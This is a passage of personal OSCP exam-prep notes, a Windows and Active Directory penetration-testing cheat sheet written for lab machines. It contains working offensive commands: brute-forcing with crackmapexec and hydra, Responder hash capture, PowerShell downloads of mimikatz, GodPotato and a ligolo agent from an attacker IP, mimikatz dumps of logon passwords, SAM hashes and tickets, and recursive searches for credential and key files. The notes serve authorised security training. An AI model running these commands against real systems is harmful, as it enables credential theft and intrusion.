.\seatbelt.exe WindowsAutoLogon
.\seatbelt InterestingFiles PuttyHostKeys
```
4. Check environment variables (`gci env:`) and tasks (`schtasks /query /fo LIST /v > tasks.txt`) \
5. Check powershell history file: `Get-History` and `(Get-PSReadlineOption).HistorySavePath` \
6. Check running services and open sockets to new targets (`netstat -ano`). \
Note especially INTERNAL PORTS (i.e. services) which are not exposed externally. \
Restartable services could also indicate DLL/binary-hijacking attack path.
```powershell
# List running service paths
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# Lists services that current user can start/stop (restart)
Get-Service | Where-Object { $_.ServiceType -eq 'Win32OwnProcess, Win32OwnProcess' -and $_.Status -eq 'Running' -and (Get-Service $_.Name).CanStop -eq $true }
# If service dir/executable/dll is not writable check `$env:path` and DLL hijacking. Also note unqouted service paths.
```
6. Remember to also check scheduled tasks and old versions + exploit \
7. Can crack more hashes?
8. If we have no creds, get current user's NTLMv2 hash with either winPEAS or connect to Kali SMB share (e.g. Responder -> Note use -A to be sure it's allowed on exam (no spoofing), or just use impacket-smbclient))


- Comment: For web stuff set /etc/hosts to domain (FQDN) e.g. web02.relia.com
- Comment: Try all known creds for all services e.g. SMB and RDP and SSH and website, and not give up on first invalid creds.\
		If a pair of credentials is specified to go to a specific host double check and try it everywhere carefully there.

**BONUS STUFF TO TRY / CONSIDER:**

See also, e.g.: \
<https://gabb4r.gitbook.io/oscp-notes/web-http/directory-fuzzing> \
<https://fareedfauzi.gitbook.io/oscp-playbook/services-enumeration/http-s/enumeration-checklist> \
More overiew: <https://blog.leonardotamiano.xyz/tech/oscp-technical-guide>

```bash
# Stupid bruteforce in background
crackmapexec smb ms01 -u ~/tmp/common_usernames_services.txt     -p ~/tmp/common_passwords_rockyou200.txt
crackmapexec smb ms01 -u ~/tmp/common_usernames_services.txt     -p ~/tmp/common_passwords_rockyou200.txt  --local-auth
crackmapexec winrm  ms01 -u ~/tmp/common_usernames_services.txt  -p ~/tmp/common_passwords_rockyou200.txt
crackmapexec winrm  ms01 -u ~/tmp/common_usernames_services.txt  -p ~/tmp/common_passwords_rockyou200.txt  --local-auth
hydra -L ~/tmp/common_usernames_services.txt -P ~/tmp/common_passwords_rockyou200.txt ms01 -t 20 ssh -V -I -v

# No auth #
# SMB no auth
smbclient -L ms01 -W oscp.exam -N
# RPC no auth
rpcclient --user="" --command=enumprivs -N

# Extra NMAP tests (usually nothing)
nmap -p- -sT -Pn -sV -sC -v -oA enum ms01
nmap -p445 --script smb-enum-shares  ms01

NOTE: think more exam, FTP -> web exploit (or phishing) is likely. Has web server, try dirbust a little more or check around. But not 100% ofc.
NOTE: note windows build from SMB or winrm handshake

# Unknown ports
echo "version" | nc ms01 PORT

# dirbust but looking for specific suffix (but can be achieve I think with gobuster `-p pattern.txt`, see web_apps.md notes)
wfuzz -w wordlist/general/common.txt --hc 404 http://testphp.vulnweb.com/FUZZ/admin.php

# Regarding the host you come from (?), there are attacks since multiple different sites could be shown
# This is probably not relevant, BUT IF YOU FIND A HINT TO OTHER HOSTNAMES TO SITE YOU CAN TRY DIFFERENT! Maybe even as part of PE
# VHOST fuzzing: https://gabb4r.gitbook.io/oscp-notes/web-http/directory-fuzzing
# Explanation: https://www.reddit.com/r/oscp/comments/klzvro/recently_i_have_been_working_on_hack_the_box/
```

**Earlier learnings** (TODO)
```
Learnings 1:
1. first of all search "port 1234 exploits" or so for each unknown/unsure port!!
	Check also "port 1234 HTB" "application-name HTB" and similar
2. nmap also UDP ports (-sU)
3. ftp: if error, try also ftp -p (passive mode). If this doesnt work, idk? Try something else.
4. triple check nmap output
5. set FQDN in /etc/hosts (e.g.: ms01.oscp.exam)
6. Try one thing at a time: e.g. attack failed if first web form field has bad data
7. (remember to use local smb server - responder - to get target NTLMv2 hash if we can make them connect to us

Learnings 2:
1. If things are insanely slow, might need to revert
2. Set up ligolo to reach from internal to kali, this is easy. Dedicated port for nc and HTTP
3. If got Impersonate, just GodPotato a rev shell directly
4. if exfiltration is unclear, see: https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration#scp
5. If rev shell doesnt work double check syntax (nc64.exe requires `-e`)
6. Different web server instances/ports may run as different users, pwn all when possible.
7. I think you should always be able to PE MS01, but if stuck ofc try as-rep & kerberoasting + scan internal network. Dont waste too much time on bruteforcing or exploiting internal network however, probably.

note: if AD is stuck or looks confusing, use bloodhound and to check for things such as groups in groups (OrganizationUnit OU).
	  But probably we can just go blind and try all accounts and services anyway?

note: for blind bruteforce, try at least local administrator (remember --local-auth)

Learnings 3:
1. if there's nothing else than web server, dirbust like crazy. _Usually_ services like this is a hint where to start attack.
2. RPC has not helped me yet (i.e. check the RPC list quickly at first, normal programs could be ignored)
3. :5040 is a normal Windows port: it's some RPC thing
4. (deep) Blind bruteforcing is usually not help
5. High ports (496XX) are usually not interesting per se (usually RPC = usually requires creds, and specific protocols)
6. Exploitable software usually will be shown with a hint: a name or a vulnerable version. Too slow to just guess.
7. Nmap says "http-open-proxy:", so this is normal then I assume
8. Probably unnecessary to gobust winrm (http) ports
9. This is probably normal:
	| smb2-capabilities: 
	|   2:0:2: 
	|     Distributed File System
	|   2:1:0: 
	|     Distributed File System
	|     Leasing
	|     Multi-credit operations
	|   3:0:0: 
	|     Distributed File System
	|     Leasing
	|     Multi-credit operations
	|   3:0:2: 
	|     Distributed File System
	|     Leasing
	|     Multi-credit operations
	|   3:1:1: 
	|     Distributed File System
	|     Leasing
	|_    Multi-credit operations
	| smb2-security-mode: 
	|   3:1:1:
10. ALWAYS CHECK SNMP (other UDP maybe but was not in labs and is slow)
sudo nmap -sU  -p161 192.168.190.156
11. If credentials doesnt work, try first letter capitalized and maybe other variantions. (ssh,ftp,.., are case-sensitive!)
However this is perhaps subtly hinted at (note any that starts capitalized).
```

### Div

- **FTP for reference**
```bash
# Try anonymous login! (try to read and write)
lftp 192.168.225.245 -u anonymous,
# Try also passive mode (for firewalls?)
#  That is, Server is "passive" and doesn't initiate connection, also uses random 2nd port not :20)
ftp anonymous@192.168.236.145: -p
# NOTE: in lab, server allowed anonymous login, but couldn't connect / few commands available with nc.
#		Apparently not the intended route.
#
# - FTP cmds
#  UL file: put
#  DL file: get

# Bruteforce
sudo hydra -t 10 -L test_users.txt -P /usr/share/wordlists/rockyou.txt 192.168.225.245 ftp 100
```

- **Email for reference (pop3 imap smtp)**
```bash

# Try VRFY usernames (no login)
ismtp -h 192.168.212.189 -e users.txt

# Try creds
hydra -L users_all.txt -P passwords.txt -f 192.168.212.189 imap -V
hydra -L users_all.txt -P passwords.txt -f 192.168.212.189 pop3 -V
```

- **Access websites over socks proxy** \
Just use `proxychains firefox` should work.

OR for instance set SOCKS proxy in Burp suite and access with its included browser
```bash
# Check port used
tail /etc/proxychains4.conf -n5
# Burp:
# Settings -> Search SOCKS
# IP: 127.0.0.1
# Port: 1080
```


- **Q: It should be possible for socks proxy (e.g. Chisel) to tunnel DNS request**
```
According to https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6
1. proxy_dns should already be enabled in /etc/proxychains4.conf
2. export PROXYRESOLVE_DNS=172.16.111.6

But didnt work with dig, ping, .. so idk.
```

- **TODO: try**, and make sure its allowed on exam (enumeration should be), **automatic AD enumeration with adPEAS?** <https://github.com/61106960/adPEAS> \

- **TODO: should be possible to get bloodhound files by running bloodhound from Kali with remote creds**

- TODO: some more tools \
enum4linux - Windows enum from Linux <https://www.kali.org/tools/enum4linux/>

Tool collections: \
adPEAS - enumerate AD <https://github.com/61106960/adPEAS> \
**NOTE** Some modules such as ADCS might be not allowed since it does vulnerability scanning? Run steps manually.
```powershell
. .\adPEAS.ps1
Invoke-adPEAS -Module Domain
Invoke-adPEAS -Module Rights
Invoke-adPEAS -Module GPO
Invoke-adPEAS -Module Creds #Not sure but I'd argue this only does enumeration of domain users attributes and therefore allowed (similar to sharphound)
Invoke-adPEAS -Module Delegation
Invoke-adPEAS -Module Accounts
Invoke-adPEAS -Module Computer
Invoke-adPEAS -Module Bloodhound -Scope All #Note: requires bloodhound >=5.0 (CE) or so
```
PowerSharpPack - Windows PE <https://github.com/S3cur3Th1sSh1t/PowerSharpPack> \
AutoRecon - network enum (IS IT ALLOWED?) <https://github.com/Tib3rius/AutoRecon> \

Good but not really allowed: \
linWinPwn - (NOTE: not allowed /w auto exploits) Windows/AD checks https://github.com/lefayjey/linWinPwn

List of tools: <https://falconspy.medium.com/unofficial-oscp-approved-tools-b2b4e889e707>


- **TODO! Note Crackmapexec can be misleading, try creds on everything regardless**\
  **NOTE!: CME is not maintained, deprecated, can also try: `netexec`** \
  ---> <https://www.netexec.wiki/>

- Quick examples
```powershell
$MY_IP = "192.168.49.98"
iwr -uri $MY_IP/winPEASx64.exe -out winPEASx64.exe
iwr -uri $MY_IP/seatbelt.exe -out seatbelt.exe
iwr -uri $MY_IP/mimikatz.exe -out mimikatz.exe
iwr -uri $MY_IP/ligolo_agent_win64.exe -out ligolo_agent_win64.exe
iwr -uri $MY_IP/GodPotato-NET4.exe -out GodPotato-NET4.exe
iwr -uri $MY_IP/adPEAS.ps1 -out adPEAS.ps1

$MY_IP = "192.168.49.98"
.\ligolo_agent_win64.exe -connect $MY_IP:11601 -ignore-cert
.\ligolo_agent_win64.exe -connect 192.168.49.98:11601 -ignore-cert

# TODO! This should also grep for any plaintext password! lol
# Print all user+ntlm (TODO manually check that this doesnt miss anything I guess)
./mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"   | Select-String 'ntlm' -Context 2,0 | % { $_.Context.PreContext; $_.Line }
./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit" |  Select-String 'hash ntlm' -Context 1,0 | % { $_.Context.PreContext; $_.Line }
# Pass the ticket
./mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
dir

# gci short
gci -Path C:\Users -Include * -File -Recurse -ErrorAction SilentlyContinue -Force
gci -Path C:\inetpub -Include * -File -Recurse -ErrorAction SilentlyContinue -Force
gci -Path C:\ -Include SYSTEM,SAM,security.save,*.kdbx,*.ppk,ssh*key,*id_*sa*,*.pub,*authorized_keys*,*.ovpn -File -Recurse -ErrorAction SilentlyContinue -Force
```


- Windows variables \
TODO what is difference between $VAR and $env:VAR? Does it have a unix equivalent?
```powershell
$env:RUST_BACKTRACE = "full"
echo $env:RUST_BACKTRACE
```
